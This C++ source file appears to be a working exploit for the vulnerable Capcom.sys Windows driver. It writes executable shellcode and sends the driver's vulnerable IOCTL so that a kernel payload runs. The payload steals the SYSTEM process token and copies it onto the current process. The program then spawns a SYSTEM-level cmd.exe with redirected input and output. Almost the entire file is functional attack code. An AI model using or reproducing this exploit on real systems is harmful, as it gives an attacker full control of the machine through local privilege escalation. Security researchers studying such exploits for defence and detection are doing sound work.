// Copyright (c) 2016, Satoshi Tanda. All rights reserved.
// Use of this source code is governed by a MIT-style license that can be
// found in the LICENSE file.

#include "stdafx.h"
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <string>
#include <iostream>
#include <sstream>
#include <thread>


#pragma comment(lib, "ntdll.lib")

////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//

////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//

#define BUFSIZE 4096

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;


////////////////////////////////////////////////////////////////////////////////
//
// types
//

typedef void *PEPROCESS;

using PSGETCURRENTPROCESSID = HANDLE(NTAPI*)();

using PSLOOKUPPROCESSBYPROCESSID = NTSTATUS(NTAPI *)(_In_ HANDLE ProcessId,
    _Out_ PEPROCESS * Process);

using OBDEREFERENCEOBJECT = VOID(NTAPI *)(_In_ PVOID Object);

using PSREFERENCEPRIMARYTOKEN = PACCESS_TOKEN(NTAPI *)(
    _Inout_ PEPROCESS Process);

using PSDEREFERENCEPRIMARYTOKEN = VOID(NTAPI *)(
    _In_ PACCESS_TOKEN PrimaryToken);

using MMGETSYSTEMROUTINEADDRESS = PVOID(NTAPI *)(
    _In_ PUNICODE_STRING SystemRoutineName);

// Represents shellcode to be executed
#include <pshpack1.h>
typedef struct _SHELLCODE
{
    BYTE Nop[1];
    BYTE Sti[1];
    BYTE Jmp[6];
    void *PayloadAddress;
} SHELLCODE, *PSHELLCODE;
#include <poppack.h>

// Represents a layout of in-buffer for the vulnerable IOCTL
typedef struct _IOCTL_IN_BUFFER
{
    void *ShellcodeAddress;
    SHELLCODE Shellcode;
} IOCTL_IN_BUFFER, *PIOCTL_IN_BUFFER;

////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

static bool ExploitCapcomDriver();

static void KernelPayload(MMGETSYSTEMROUTINEADDRESS MmGetSystemRoutineAddress);

static void *GetSystemRoutineAddress(
    MMGETSYSTEMROUTINEADDRESS MmGetSystemRoutineAddress,
    const wchar_t *RoutineName);

static PACCESS_TOKEN GetProceesTokenAddress(ULONG_PTR Address);

static bool LaunchShell();

void STDIN_Redirect(void);

void STDOUT_Redirect(void);

void ErrorExit(std::string);

////////////////////////////////////////////////////////////////////////////////
//
// variables
//

// Indicates whether token stealing is done successfully
static BOOLEAN gIsTokenStealingSuccessful = FALSE;

////////////////////////////////////////////////////////////////////////////////
//
// implementations
//

int main()
{
    ExploitCapcomDriver();
    return 0;
}

// Makes std::unique_ptr withe a custom deleter
template <class Resource, class Deleter> static
std::unique_ptr<Resource, Deleter> make_unique_ex(Resource *p,
    Deleter d = Deleter())
{
    return std::unique_ptr<Resource, Deleter>(p, std::forward<Deleter>(d));
}

// Exploits the vulnerable feature in capcom.sys and launches the SYSTEM cmd.exe
static bool ExploitCapcomDriver()
{
    std::cout << std::hex;
    std::cout << "[*] Capcom.sys exploit" << std::endl;

    // Open the device created by Capcom.sys
    auto DeviceHandle = make_unique_ex(
        CreateFile(TEXT("\\\\.\\Htsysm72FB"), GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr),
        ::CloseHandle);
    if (DeviceHandle.get() == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] CreateFile failed" << std::endl;
        return false;
    }
    std::cout << "[*] Capcom.sys handle was obtained as " << DeviceHandle.get()
        << std::endl;

    //
    // Allocate an executable memory containing shellcode. The data structure 
    // should have an address of code to executed. In this exploit, trampoline
    // code leads to KernelPayload is also given as the function to execute.
    //
    auto InBufferContents = reinterpret_cast<PIOCTL_IN_BUFFER>(VirtualAlloc(
        nullptr, sizeof(IOCTL_IN_BUFFER), MEM_COMMIT, PAGE_EXECUTE_READWRITE));
    if (!InBufferContents)
    {
        std::cout << "[-] VirtualAlloc failed" << std::endl;
        return false;
    }
    InBufferContents->ShellcodeAddress = &InBufferContents->Shellcode;

    //
    // This code is executed first by the feature on PASSIVE_LEVEL, interruption
    // disabled state. This shellcode first enables interruptions so that
    // Windows can page-in the KernelPayload even if it is paged-out, and
    // KernelPayload can call kernel API. Then this code transfers execution to
    // KernelPayload.
    //
    //
    InBufferContents->Shellcode = {
        { 0x90, },                                  //      nop     ; for debugging
        { 0xfb, },                                  //      sti
        { 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, },    //      jmp qword ptr [nextline]
                                                    // nextline:
        &KernelPayload,                             //      dq KernelPayload
    };
    std::cout << "[*] Shellcode was placed at " << &InBufferContents->Shellcode
        << std::endl;

    // +8 because, capcom.sys uses an address of IOCTL buffer - 8
    auto InBuffer = reinterpret_cast<ULONG_PTR>(InBufferContents) + 8;
    static_assert(sizeof(InBuffer) == 8, "an in buffer size must be 8");

    uint32_t OutBuffer = 0;
    static_assert(sizeof(OutBuffer) == 4, "an out buffer size must be 4");

    // Issue IOCTL for the vulnerable feature
    static const DWORD VulnerableIoctlCode = 0xaa013044;
    DWORD BytesReturned = 0;
    auto Ok = DeviceIoControl(DeviceHandle.get(), VulnerableIoctlCode, &InBuffer,
        sizeof(InBuffer), &OutBuffer, sizeof(OutBuffer),
        &BytesReturned, nullptr);
    VirtualFree(InBufferContents, 0, MEM_RELEASE);  // no longer necessary
    if (!Ok)
    {
        std::cout << "[-] DeviceIoControl failed" << std::endl;
        return false;
    }
    std::cout << "[+] Shellcode was executed" << std::endl;

    // Is this process running in the SYSTEM privileges
    if (!gIsTokenStealingSuccessful)
    {
        std::cout << "[-] Token stealing failed" << std::endl;
        return false;
    }
    std::cout << "[+] Token stealing was successful" << std::endl;

    ///////////////////////////////////////////////////////////////////
    // Launch command prompt
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT.
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
        ErrorExit("StdoutRd CreatePipe");

    // Ensure the read handle to the pipe for STDOUT is not inherited.
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        ErrorExit("Stdout SetHandleInformation");

    // Create a pipe for the child process's STDIN.
    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
        ErrorExit("Stdin CreatePipe");

    // Ensure the write handle to the pipe for STDIN is not inherited.
    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
        ErrorExit("Stdin SetHandleInformation");

    if (!LaunchShell())
    {
        std::cout << "[-] CreateProcess() failed" << std::endl;
        return false;
    }
    return true;
}

//
// Performs token stealing and elevates the current process to SYSTEM
//
static void KernelPayload(MMGETSYSTEMROUTINEADDRESS MmGetSystemRoutineAddress)
{
    auto PsLookupProcessByProcessId =
        reinterpret_cast<PSLOOKUPPROCESSBYPROCESSID>(GetSystemRoutineAddress(
            MmGetSystemRoutineAddress, L"PsLookupProcessByProcessId"));

    auto ObDereferenceObject =
        reinterpret_cast<OBDEREFERENCEOBJECT>(GetSystemRoutineAddress(
            MmGetSystemRoutineAddress, L"ObDereferenceObject"));

    auto PsReferencePrimaryToken =
        reinterpret_cast<PSREFERENCEPRIMARYTOKEN>(GetSystemRoutineAddress(
            MmGetSystemRoutineAddress, L"PsReferencePrimaryToken"));

    auto PsDereferencePrimaryToken =
        reinterpret_cast<PSDEREFERENCEPRIMARYTOKEN>(GetSystemRoutineAddress(
            MmGetSystemRoutineAddress, L"PsDereferencePrimaryToken"));

    auto PsGetCurrentProcessId =
        reinterpret_cast<PSGETCURRENTPROCESSID>(GetSystemRoutineAddress(
            MmGetSystemRoutineAddress, L"PsGetCurrentProcessId"));

    // Get the process object of the kernel
    auto SystemProcess =
        *reinterpret_cast<PEPROCESS*>(GetSystemRoutineAddress(
            MmGetSystemRoutineAddress, L"PsInitialSystemProcess"));

    // Get the process object of the current process
    PEPROCESS CurrentProcess = nullptr;
    NTSTATUS Status = PsLookupProcessByProcessId(PsGetCurrentProcessId(),
        &CurrentProcess);
    if (!NT_SUCCESS(Status))
    {
        return;
    }

    auto CurrentToken = PsReferencePrimaryToken(CurrentProcess);
    auto SystemToken = PsReferencePrimaryToken(SystemProcess);

    // Search the token field from EPROCESS up to a 0x80 pointers size
    for (auto Offset = 0ul; Offset < sizeof(void *) * 0x80;
        Offset += sizeof(void *))
    {
        // Is this address stores token?
        const auto TestAddress =
            reinterpret_cast<ULONG_PTR>(CurrentProcess) + Offset;
        const auto ProbableToken = GetProceesTokenAddress(TestAddress);
        if (ProbableToken == CurrentToken)
        {
            // Found the field, replace the contents with the SYSTEM token
            auto TokenAddress = reinterpret_cast<PACCESS_TOKEN *>(TestAddress);
            *TokenAddress = SystemToken;
            gIsTokenStealingSuccessful = TRUE;
            break;
        }
    }

    PsDereferencePrimaryToken(CurrentToken);
    PsDereferencePrimaryToken(SystemToken);
    ObDereferenceObject(CurrentProcess);
}

// Returns an address of exports in NT or HAL
static void *GetSystemRoutineAddress(
    MMGETSYSTEMROUTINEADDRESS MmGetSystemRoutineAddress,
    const wchar_t *RoutineName)
{
    UNICODE_STRING RoutineNameU = {};
    RtlInitUnicodeString(&RoutineNameU, RoutineName);
    return MmGetSystemRoutineAddress(&RoutineNameU);
}

// Returns an address of a token assuming that Address points to the Token field
static PACCESS_TOKEN GetProceesTokenAddress(ULONG_PTR Address)
{
    //
    // To get an address of a token from the Token field in EPROCESS, the lowest
    // N bits where N is size of a RefCnt field needs to be masked.
    //
    // kd> dt nt!_EX_FAST_REF
    //   + 0x000 Object : Ptr64 Void
    //   + 0x000 RefCnt : Pos 0, 4 Bits
    //   + 0x000 Value  : Uint8B
    //
    const auto Value = *reinterpret_cast<ULONG_PTR *>(Address);
    return reinterpret_cast<PACCESS_TOKEN>(Value &
        (static_cast<ULONG_PTR>(~0xf)));
}


// Launches a command shell process
static bool LaunchShell()
{
    // Create a console process that uses the previously created pipes for STDIN and STDOUT.
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    // Set up members of the PROCESS_INFORMATION structure.
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure.
    // This structure specifies the STDIN and STDOUT handles for redirection.
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;


    // Create a console process that uses the previously created pipes for STDIN and STDOUT.
    bSuccess = CreateProcess(CommandLine,
        CommandLine,            // command line
        nullptr,                // process security attributes
        nullptr,                // primary thread security attributes
        TRUE,                   // handles are inherited
        //CREATE_NEW_CONSOLE,     // creation flags
        0,
        nullptr,                // use parent's environment
        nullptr,                // use parent's current directory
        &siStartInfo,           // STARTUPINFO pointer
        &piProcInfo);           // receives PROCESS_INFORMATION

    // If an error occurs, exit the application.
    if (!bSuccess)
    {
        std::cout << "/!\\ CreateProcess error" << std::endl;
        return false;
    }
    else
    {
        // Close handles to the child process and its primary thread.
        // Some applications might keep these handles to monitor the status
        // of the child process, for example.
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        // Close handles to the stdin and stdout pipes no longer needed by the child process.
        // If they are not explicitly closed, there is no way to recognize that the child process has ended.
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);

        std::cout << "[+] The SYSTEM shell was launched" << std::endl;

        // Child STDOUT to Parent STDOUT
        std::thread thread_OUT(STDOUT_Redirect);

        // Parent STDIN to Child STDIN
        STDIN_Redirect();

        return true;
    }

    CloseHandle(piProcInfo.hThread);
    CloseHandle(piProcInfo.hProcess);
    return true;
}


void STDIN_Redirect(void)
// Read input from the parent process's pipe for STDIN
// and write to the child process's pipe for STDIN.
{
    DWORD dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);
    std::string str;

    while (std::getline(std::cin, str))
    {
        str = str + "\n";
        strcpy_s(chBuf, str.c_str());

        bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, str.length(), &dwWritten, NULL);
        if (!bSuccess) {
            std::cout << "/!\\ Write to STDIN error" << std::endl;
            break;
        }

    }
    // Close the pipe handle so the child process stops reading.
    if (!CloseHandle(g_hChildStd_IN_Wr))
        ErrorExit("StdInWr CloseHandle");
}


void STDOUT_Redirect(void)
// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT.
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    for (;;)
    {
        bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) {
            ExitProcess(1);
        }

        bSuccess = WriteFile(hParentStdOut, chBuf,
            dwRead, &dwWritten, NULL);
        if (!bSuccess) {
            std::cout << "/!\\ Write to STDOUT error" << std::endl;
            break;
        }
    }
}


void ErrorExit(std::string str)
// Print error message and exit from the application.
{
    std::cout << "/!\\ " << str << std::endl;
    ExitProcess(1);
}
